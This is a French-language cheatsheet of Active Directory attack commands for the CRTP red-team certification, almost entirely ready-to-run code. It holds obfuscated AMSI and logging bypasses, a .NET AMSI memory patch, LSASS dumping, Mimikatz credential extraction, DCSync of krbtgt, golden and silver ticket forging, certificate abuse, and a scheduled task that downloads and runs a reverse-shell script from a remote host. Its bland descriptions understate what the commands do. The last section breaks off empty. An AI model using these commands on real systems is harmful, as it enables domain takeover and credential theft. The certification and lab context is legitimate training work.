---
title: "CRTP · Cheatsheet"
description: "Commandes et repères pour Active Directory, Windows et Kerberos."
---

# CRTP · Cheatsheet

Référence rapide des commandes. Chaque bloc est accompagné d'une explication courte.

## Bypass

Repères sur les mécanismes de contrôle et de journalisation de PowerShell.

### AMSI Bypass

Le script agit sur les mécanismes internes d'AMSI dans la session PowerShell.

```powershell
Set-Item ('Va'+'rI'+'a'+'blE:1'+'q2'+'uZx') ([TYpE]("F"+'rE')) 
(Get-variable (('1Q'+'2U') +'zX'))."A`ss`Embly"."GET`TY`Pe"(('Uti'+'l','A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em'))).g`etf`iElD"(('a'+'msi'),'d',('I'+'nitF'+'aile'))).(sE`T`VaLUE)(${n`ULl},${t`RuE})
```

### Script Block Logging

Le code cible le mécanisme de journalisation des Script Blocks PowerShell.

```powershell
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'twProvid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

### .NET AMSI Bypass

Cet exemple contient du code .NET destiné à interagir avec AMSI.

```powershell
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ =
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

## Enumeration

Commandes d'énumération Active Directory avec le module AD et PowerView.

### AD Module - Import

Charge les composants PowerShell nécessaires aux requêtes Active Directory.

```powershell
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

### AD Module - Enumeration

Regroupe des requêtes sur les utilisateurs, machines, groupes, trusts et objets du domaine.

```powershell
Get-ADUser -Filter * | Select -ExpandProperty samaccountname
Get-ADComputer –Filter * | select –expand name
Get-ADGroup -Identity 'Domain Admins' -Properties *
Get-ADGroup -Identity machineadmins -Properties Description
Get-ADGroupMember -Identity 'Domain Admins'
Get-ADGroupMember -Identity 'Enterprise Admins'
Get-ADGroupMember -Identity 'Enterprise Admins' -Server domain.local
Get-ADOrganizationalUnit -Identity 'OU=StudentsMachines,DC=us,DC=domain,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | select name
Get-ACL 'AD:\CN=Domain Admins,CN=Users,DC=us,DC=domain,DC=local' | select -ExpandProperty Access
(Get-ADForest).Domains
Get-ADTrust -Filter *
Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name
(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}
Get-ADTrust -Filter * -Server domain.local
```

### PowerView - Import

Charge PowerView dans la session PowerShell courante.

```powershell
. C:\AD\Tools\PowerView.ps1
```

### PowerView - Enumeration

Interroge les politiques Kerberos, GPO, groupes, sessions et relations de domaine.

```powershell
(Get-DomainPolicy).KerberosPolicy
Get-DomainGPOLocalGroup
Get-DomainGroupMember -Identity <group>
Get-DomainOU
(Get-DomainOU -Identity <OU>).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
Get-DomainGPO
(Get-DomainOU -Identity <OU>).gplink
Get-DomainGPO -Identity '{<result of .gplink>}'
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<user>"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<group>"}
Get-ForestDomain -Verbose | Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'}
Get-ForestTrust -Forest <forest>
```

## Local Privesc

Contrôles locaux sur les permissions Windows, les services et les groupes.

### Local Privilege Escalation - PowerUp

Prépare l'environnement et lance des contrôles de configuration locale avec PowerUp.

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
Invoke-ServiceAbuse -Name ALG -UserName domain\studentuserx -Verbose
```

### Services Windows - AccessChk

Examine les permissions de service et illustre leur impact sur la configuration du service.

```powershell
.\accesschk64.exe -uwcqv 'user' *

sc.exe config ALG binPath= "net localgroup administrators domain\user
/add"
sc.exe stop ALG
sc.exe start ALG
sc.exe config ALG binPath= "C:\WINDOWS\System32\alg.exe"
sc.exe stop ALG
sc.exe start ALG
```

### Local Admin Access

Recherche les machines où le contexte courant possède des droits administratifs.

```powershell
Find-LocalAdminAccess -Verbose
Find-WMILocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess.ps1
```

### Group Membership

Parcourt récursivement les appartenances aux groupes Active Directory.

```powershell
function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName) {
  $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname) 
  $groups
  if ($groups.count -gt 0) {
    foreach ($group in $groups) {
      Get-ADPrincipalGroupMembershipRecursive $group
    }
  }
}
```

### ACL Enumeration

Recherche les entrées ACL associées à des identités ou groupes précis.

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'managers'}
Get-DomainObjectAcl -Identity machineadmins -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'managers'}
```

## LAPS

Vérification des permissions et des attributs liés à Local Administrator Password Solution.

### LAPS - Modules

Charge les modules AD et LAPS puis consulte les permissions associées.

```powershell
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose
C:\AD\Tools\Get-LapsPermissions.ps1
```

### LAPS - Permissions

Examine les ACL pour identifier les identités disposant d'un droit de lecture sur l'attribut LAPS.

```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_}
```

### LAPS - Password Retrieval

Consulte l'attribut de mot de passe LAPS lorsque le compte dispose des autorisations requises.

```powershell
Get-ADComputer -Identity <computer> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
Get-AdmPwdPassword -ComputerName <computer>
Get-DomainObject -Identity <computer> | select -ExpandProperty ms-mcs-admpwd
```

### LAPS - Remote Access

Montre des exemples de connexion distante avec un compte administrateur local.

```powershell
winrs -r:<computer> -u:.\administrator -p:<passwd> cmd
$passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<computer>\administrator", $passwd)
$mailmgmt = New-PSSession -ComputerName <computer> -Credential $creds
$mailmgmt
```

## Extract Credentials

Exemples de sessions distantes, de transfert et d'examen du matériel d'authentification.

### WinRS - File Transfer

Utilise WinRS et un partage administratif pour transférer un exécutable.

```powershell
winrs net use x: \\<computer>\C$\Users\Public /user:<computer>\Administrator <password>
echo F | xcopy C:\AD\Tools\Loader.exe x:\Loader.exe
net use x: /d
```

### Portproxy

Configure une redirection de port TCP sur la machine distante.

```powershell
winrs -r:<computer> -u:.\administrator -p:<password> cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.X
```

### SafetyKatz - Credential Material

Charge un outil d'analyse des secrets d'authentification et interroge les clés disponibles.

```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
sekurlsa::keys
```

### BITSAdmin

Illustre un transfert de fichier effectué avec BITSAdmin.

```powershell
winrs -r:<computer> -u:.\administrator -p:<password>
"bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Users\\Public\\Loader.exe"
```

### PowerShell Remoting - Session

Crée une session PowerShell distante à partir d'un objet PSCredential.

```powershell
$passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<computer>\administrator", $passwd)
$mailmgmt = New-PSSession -ComputerName <computer> -Credential $creds
Enter-PSSession $mailmgmt
```

### Invoke-Mimi - Remote Execution

Exécute un script dans la session distante déjà ouverte.

```powershell
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $mailmgmt
Enter-PSSession $mailmgmt
Invoke-Mimi -Command '"sekurlsa::keys"'
```

## gMSA

Énumération des comptes Group Managed Service Account et de leurs autorisations.

### gMSA - Enumeration

Identifie un compte de service gMSA et les identités autorisées à lire son secret géré.

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
Get-ADServiceAccount -Filter *
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```

### gMSA - Managed Password

Lit et transforme les données du mot de passe gMSA dans un contexte autorisé.

```powershell
Import AD Module again, then:
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
To decode the password we can use DSinternals:
Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
ConvertTo-NTHash –Password $decodedpwd.SecureCurrentPassword
```

## PTH

Exemples de contextes d'authentification avec hashes et tickets Kerberos.

### Pass-the-Hash - AES

Présente l'utilisation de matériel de clé AES pour lancer un processus avec une autre identité.

```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:<user> /domain:<domain> /aes256:<password> /run:cmd.exe" "exit"
```

### Pass-the-Hash - NTLM et S4U

Regroupe des exemples fondés sur NTLM et sur des tickets Kerberos S4U.

```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:<user> /domain:<domain>  /ntlm:<password> /run:cmd.exe" "exit"

C:\AD\Tools\Rubeus.exe s4u /user:<user> /aes256:<password> /impersonateuser:administrator /msdsspn:CIFS/<machine.domain> /altservice:HTTP /domain:<domain> /ptt
```

### Rubeus - AskTGT

Demande un TGT Kerberos en utilisant le matériel d'authentification fourni.

```powershell
C:\AD\Tools\Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<password> opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

## Application Whitelisting

Vérification des contrôles Windows CLM, AppLocker et WDAC, ainsi que d'artefacts locaux.

### Constrained Language Mode

Affiche le mode de langage actif dans la session PowerShell.

```powershell
$ExecutionContext.SessionState.LanguageMode
```

### AppLocker - Policy

Consulte les clés de stratégie et la politique AppLocker effective.

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
Get-AppLockerPolicy –Effective
```

### WDAC - Device Guard

Interroge l'état de Device Guard et les paramètres de contrôle d'intégrité du code.

```powershell
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
CodeIntegrityPolicyEnforcementStatus : 2
UsermodeCodeIntegrityPolicyEnforcementStatus : 2
```

### LSASS - Process Dump

Identifie le processus LSASS et illustre la création d'un fichier de vidage mémoire.

```powershell
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
```

### LSASS - Dump Transfer

Copie un fichier de vidage LSASS depuis un partage administratif.

```powershell
echo F | xcopy \\us-jump\C$\Users\Public\lsass.dmp C:\AD\Tools\lsass.dmp
```

### Mimikatz - Minidump

Charge un fichier de vidage mémoire et examine les données d'authentification qu'il contient.

```powershell
sekurlsa::minidump C:\AD\Tools\lsass.DMP
privilege::debug
sekurlsa::keys
```

### InviShell - File Transfer

Copie les fichiers nécessaires à InviShell sur une machine distante.

```powershell
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\us-jump\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\us-jump\C$\Users\Public\InShellProf.dll /Y
```

### Certificate - Export

Ouvre une session distante, consulte un certificat et exporte un fichier PFX.

```powershell
winrs -r:us-jump cmd
C:\Users\Public\RunWithRegistryNonAdmin.bat
ls cert:\LocalMachine\My
ls cert:\LocalMachine\My\BAD78F43BB4CB13C4843E49B51AA051530FFBBDB | Export-PfxCertificate -FilePath C:\Users\Public\user.pfx -Password (ConvertTo-SecureString -String 'SecretPass@123' -Force -AsPlainText)
```

### Certificate - Transfer

Rapatrie le fichier PFX exporté depuis la machine distante.

```
echo F | xcopy \\us-jump\C$\Users\Public\user.pfx C:\AD\Tools\user.pfx
```

## Unconstrained delegation

Recherche des systèmes configurés avec Unconstrained Delegation et observation des tickets.

### Unconstrained Delegation - Discovery

Liste les objets ordinateurs configurés avec une délégation non contrainte.

```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```

### Unconstrained Delegation - Access

Prépare une session et recherche les accès administratifs disponibles.

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
cd C:\AD\Tools\
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Verbose
```

### Rubeus - Monitoring via WinRS

Transfère Rubeus et surveille les tickets visibles sur la machine distante.

```powershell
echo F | xcopy C:\AD\Tools\Rubeus.exe \\us-web\C$\Users\Public\Rubeus.exe /Y
winrs -r:us-web cmd.exe
C:\Users\Public\Rubeus.exe monitor /targetuser:DC$ /interval:5 /nowrap
```

### Rubeus - Monitoring via Remoting

Réalise la même opération au moyen d'une session PowerShell Remoting.

```powershell
$usweb1 = New-PSSession us-web
Copy-Item -ToSession $usweb1 -Path C:\AD\Tools\Rubeus.exe -Destination C:\Users\Public
Enter-PSSession $usweb1
cd C:\Users\Public .\Rubeus.exe monitor /targetuser:DC$ /interval:5 /nowrap
```

### MS-RPRN

Illustre une interaction MS-RPRN entre un contrôleur de domaine et un serveur cible.

```powershell
C:\AD\Tools\MS-RPRN.exe \\dc.domain.local \\us-web.domain.local
```

### Rubeus - Pass-the-Ticket

Importe un ticket Kerberos encodé dans la session courante.

```powershell
C:\AD\Tools\Rubeus.exe ptt /ticket:TGTofDC$
```

### DCSync - KRBTGT

Présente une requête de réplication DCSync ciblant le compte KRBTGT.

```powershell
C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\krbtgt --Domain domain.local --DomainController dc.domain.local
```

### DCSync - Administrator

Présente une requête DCSync ciblant un compte administrateur du domaine.

```powershell
C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\administrator --Domain domain.local --DomainController domain-dc.domain.local
```

### DCSync - Forest

Présente un exemple de requête DCSync dans une autre forêt.

```powershell
C:\AD\Tools\SharpKatz.exe --Command dcsync --User usvendor\krbtgt --Domain usvendor.local --DomainController usvendor-dc.usvendor.local
```

## Constrained delegation

Identification de Constrained Delegation et exemples de tickets de service.

### Constrained Delegation - Enumeration

Recherche les objets dotés de l'attribut msDS-AllowedToDelegateTo.

```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

### Kerberos Tickets et WinRS

Affiche les tickets présents et teste une connexion distante WinRS.

```powershell
klist
winrs -r:us-mssql.domain.local cmd.exe
```

### Constrained Delegation - Other Forest

Interroge l'attribut de délégation dans un domaine explicitement désigné.

```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server domain.local
```

### Rubeus - S4U

Présente une requête S4U associée à une configuration de délégation contrainte.

```powershell
C:\AD\Tools\Rubeus.exe hash /password:Qwerty@123 /user:<user> /domain:domain.local
C:\AD\Tools\Rubeus.exe s4u /user:<user> /rc4:<hash> /impersonateuser:Administrator /domain:domain.local /msdsspn:nmagent/dc.domain.local /altservice:ldap /dc:dc.domain.local /ptt
```

### DCSync - Validation

Contient des exemples DCSync sur deux comptes du domaine.

```powershell
C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\krbtgt --Domain domain.local --DomainController dc.domain.local
C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\administrator --Domain domain.local --DomainController dc.domain.local
```

## ACLs Write Permissions

Analyse des ACL, des Write Permissions et de Resource-Based Constrained Delegation.

### Remote Tooling

Transfère un chargeur, établit une redirection de port et examine les clés d'authentification.

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\us-mgmt\C$\Users\Public\Loader.exe /Y
winrs -r:us-mgmt cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.x
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
sekurlsa::keys
```

### Write Permissions - ACL

Recherche les ACL associées à un compte d'administration.

```powershell
C:\AD\Tools\PowerView.ps1
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin'}
```

### RBCD - Computer Object

Configure les principaux autorisés à déléguer vers un objet ordinateur.

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
$comps = 'user1$','user2$'
Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps -Verbose
```

### Machine Keys

Interroge le matériel de clés disponible dans le contexte d'exécution.

```powershell
C:\AD\Tools\SafetyKatz.exe -Command "sekurlsa::keys" "exit"
```

### RBCD - HTTP Service

Présente une requête Kerberos S4U pour un service HTTP et une vérification de session.

```powershell
C:\AD\Tools\Rubeus.exe s4u /user:machine$ /aes256:$password /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
klist
winrs -r:us-helpdesk cmd
```

### RBCD - CIFS Service

Présente une requête S4U pour CIFS suivie d'opérations sur la machine distante.

```powershell
C:\AD\Tools\Rubeus.exe s4u /user:machine$ /aes256:$password /msdsspn:cifs/us-helpdesk /impersonateuser:administrator /ptt
echo F | xcopy C:\AD\Tools\Loader.exe \\us-helpdesk\C$\Users\Public\Loader.exe /Y
winrs -r:us-helpdesk cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.x
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
```

## Tickets

Exemples de Golden Tickets, Silver Tickets et tickets associés à différents services.

### Golden Ticket - SafetyKatz

Illustre la création d'un ticket Kerberos et son affichage dans le cache de tickets.

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /aes256:<hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
klist
echo F | xcopy C:\AD\Tools\Loader.exe \\dc\C$\Users\Public\Loader.exe /Y
winrs -r:dc cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.x
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
```

### Golden Ticket - Invoke-Mimi

Montre un exemple équivalent avec Invoke-Mimi et PowerShell Remoting.

```powershell
. C:\AD\Tools\Invoke-Mimi.ps1
Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /aes256:<hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
$sess = New-PSSession <machine name>
Enter-PSSession -Session $sess

# bypass AMSI 

exit
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
Enter-PSSession -Session $sess
Invoke-Mimi -Command '"lsadump::lsa /patch"'
```

### Silver Ticket - HOST

Présente un ticket de service Kerberos ciblant le service HOST.

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /target:<target> /service:HOST /aes256:<hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
klist
```

### Listener et Scheduled Task

Montre un listener réseau et la création d'une tâche planifiée distante.

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\powercat.ps1
powercat -l -v -p 443 -t 1000
schtasks /create /S <target machine> /SC Weekly /RU "NT Authority\SYSTEM" /TN "Userx" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.x/Invoke-PowerShellTcpEx.ps1''')'"
schtasks /Run /S <target machine> /TN "Userx"
```

### Silver Ticket - WMI

Illustre l'emploi de tickets pour les services HOST et RPCSS dans un exemple WMI.

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /target:<target dc> /service:HOST /aes256:<hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /target:<target dc> /service:RPCSS /aes256:<hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
Get-WmiObject -Class win32_operatingsystem -ComputerName <computer name>
```

## DCSync

Consultation des droits de réplication et des commandes associées à DCSync.

### DCSync - Preparation

Charge l'environnement PowerShell utilisé pour vérifier les droits de réplication.

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
```

### Replication Rights - ACL

Interroge les ACL du domaine pour examiner les droits de réplication d'une identité.

```powershell
Get-DomainObjectAcl -SearchBase "dc=us,dc=domain,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuserx"}
```

### DA - Authentication Context

Présente un exemple de création de processus utilisant un contexte administrateur du domaine.

```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:administrator /domain:domain.local /aes256:<hash> /run:cmd.exe" "exit"
```

### DCSync Rights - PowerView

Illustre une modification d'ACL accordant des droits de réplication à un principal.

```powershell
Add-DomainObjectAcl -TargetIdentity "dc=us,dc=domain,dc=local" -PrincipalIdentity studentuserx -Rights DCSync -PrincipalDomain domain.local -TargetDomain domain.local -Verbose
```

### DCSync Rights - RACE

Présente la variante de modification d'ACL avec Set-ADACL.

```powershell
Set-ADACL -DistinguishedName 'DC=us,DC=domain,DC=local' -SamAccountName studentuserx -GUIDRight DCSync -Verbose
```

### DCSync - Execution

Contient des exemples de consultation de données répliquées avec DCSync.

```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:domain\krbtgt" "exit"
Invoke-Mimi -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

## AD CS

Énumération d'Active Directory Certificate Services et exemples d'authentification par certificat.

### AD CS - Certificate Authorities

Énumère les autorités de certification et les templates accessibles avec Certify.

```powershell
C:\AD\Tools\Certify.exe cas
C:\AD\Tools\Certify.exe find
```

### AD CS - Enrollment

Recherche des templates autorisant le choix du sujet et montre une demande de ticket par certificat.

```powershell
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
C:\AD\Tools\Rubeus.exe asktgt /user:<user> /certificate:C:\AD\Tools\user.pfx /password:SecretPass@123 /nowrap /ptt
C:\AD\Tools\Certify.exe request /ca:domain-DC.domain.local\DOMAIN-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
```

### OpenSSL - PKCS#12

Convertit le certificat et sa clé en fichier PFX avec OpenSSL.

`C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx`

### AD CS - TGT

Illustre la demande d'un TGT à partir d'un certificat PFX.

```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt
winrs -r:dc whoami
```

### AD CS - Enterprise Admin

Présente un exemple de demande de TGT pour un compte d'une autre portée administrative.

```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:domain.local\Administrator /dc:domain-dc.domain.local /certificate:C:\AD\Tools\EA.pfx /password:SecretPass@123 /nowrap /ptt
winrs -r:domain-dc whoami
```

## Azure AD Connect

Repères sur les comptes MSOL utilisés avec Azure AD Connect.

### Azure AD Connect - MSOL Accounts

Recherche des comptes MSOL et prépare un contexte d'authentification.

```powershell
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server domain.local -Properties * | select SamAccountName,Description | fl
C:\AD\Tools\Rubeus.exe asktgt /domain:domain.local /user:<user> /aes256:<hash> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\us-adconnect\C$\Users\<user>\Downloads\InShellProf.dll /Y
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\us-adconnect\C$\Users\<user>\Downloads\RunWithRegistryNonAdmin.bat /Y
winrs -r:us-adconnect cmd
cd C:\Users\<user>\Downloads
RunWithRegistryNonAdmin.bat
```

### Azure AD Connect - Credentials

Exécute un script d'examen des identifiants liés à AD Connect.

```powershell
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.x/adconnect.ps1')
ADconnect
```

### MSOL - Elevated Session

Utilise une session dotée d'identifiants MSOL pour interroger la réplication AD.

```powershell
runas /user:domain.local\MSOL_16fb75d0227d /netonly cmd
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:domain\administrator /domain:domain.local" "exit"
```

### MSOL - Standard Session

Présente une variante du même contrôle depuis un environnement PowerShell standard.

```powershell
runas /user:domain.local\MSOL_16fb75d0227d /netonly cmd
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Invoke-Mimi.ps1
Invoke-Mimi -Command '"lsadump::dcsync /user:domain\administrator /domain:domain.local"'
```

## Domain Privesc (TrustKey & KRBTGT)

Exemples de tickets Kerberos et de relations de confiance entre domaines.

### TrustKey - Initial Context

Prépare un contexte d'authentification, des outils distants et une interaction avec les clés de trust.

```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:administrator /aes256:<hash> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
echo F | xcopy C:\AD\Tools\Loader.exe \\dc\C$\Users\Public\Loader.exe /Y
winrs -r:dc cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.x
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
lsadump::trust /patch
```

### TrustKey - Inter-Realm TGT

Illustre la construction d'un ticket inter-realm reposant sur une clé de relation de confiance.

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /domain:domain.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:<hash> /user:Administrator /service:krbtgt /target:domain.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
```

### TrustKey - Service Ticket

Présente une demande de ticket de service CIFS au moyen d'un ticket inter-realm.

``` powershell
C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:CIFS/domain-dc.domain.local /dc:domain-dc.domain.local /ptt
```

### Kerberos - Ticket Cache

Affiche les tickets Kerberos présents dans le cache courant.

``` powershell
klist
```

### CIFS - Share Access

Teste l'accès à un partage administratif avec le contexte d'authentification actif.

``` powershell
dir \\domain-dc.domain.local\c$
```

### KRBTGT - SID History

Présente un ticket Kerberos intégrant des SID supplémentaires.

```powershell
